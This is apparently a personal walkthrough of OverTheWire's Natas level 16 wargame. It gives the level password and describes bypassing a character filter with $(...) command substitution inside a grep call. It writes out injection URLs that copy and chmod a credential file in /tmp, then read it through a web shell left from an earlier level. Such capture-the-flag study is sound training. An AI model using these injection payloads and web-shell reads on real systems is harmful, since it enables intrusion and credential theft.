Challenge page is <a href="http://www.overthewire.org/wargames/natas/natas16.shtml">HERE</a>.

<<CHALLENGE_CONTENT
Level 16

Username: natas16
URL:      http://natas16.natas.labs.overthewire.org

CHALLENGE_CONTENT

Password for this level (from last level)
	- username: natas16
	- password: 3VfCzgaWjEAcmCQphiEPoXi9HtlmVr3L

Comment by me:
	- It is the submit form that send value into 'grep -i "$key" dictionary.txt' command
	- Now it filter for
		- not empty string
		- must not conntain [;|&`\'"]
	- Available way to do is to use Bash scripting with $(...)
		- when enclose $( ) to a command, it executes the command inside and output results as string, in-place of the command
		ex. echo "A$(date)B";  results as "AWed Dec  5 03:08:18 ICT 2012B"
	- But if we executes $(cat /etc/natas_webpass/natas17), Grep command does not print it out.
	- The idea is to let the grep runs, but we have to figure out which word is grep.
	- Obstructions are:
		- password is 32 characters long, with upper case, lower case and digits
		- 'grep -i' will match without looking at the case.
		- the 'dictionary.txt' does not contain digits to match with.
	- First try: with '^$(cut -b 1 /etc/natas_webpass/natas17)'
		- will grep single character from the file, then grep only the first character matched
		- result: '_hbzt_ljtpagmayvnfz_chzvq__oepsx'
		- problem: 
			- number will not display
			- character case is unknown, dues to the '-i' flag on grep command
	- Second try: with shell from Level12 and Level13
		- use the command to copy the password file to /tmp
		http://natas16.natas.labs.overthewire.org/?needle=$(cp /etc/natas_webpass/natas17 /tmp/anidear.txt)&submit=Search
		- change the file permission so that other user can read (so level12 or level13 can read)
		http://natas16.natas.labs.overthewire.org/?needle=$(chmod 444 /tmp/anidear.txt)&submit=Search
		- read the file with shell
		http://natas13.natas.labs.overthewire.org/upload/v960x3n9yu.php?cmd=cat%20/tmp/anidear.txt

	- Optional, to verify that the file exists, we can use:
	 http://natas16.natas.labs.overthewire.org/?needle=^$(if [ -f /tmp/anidear.txt ]%0athen%0aecho A%0aelse%0aecho %0afi)&submit=Search
	 	- if file exists, grep results in all words starting with A, if not, words starting with B

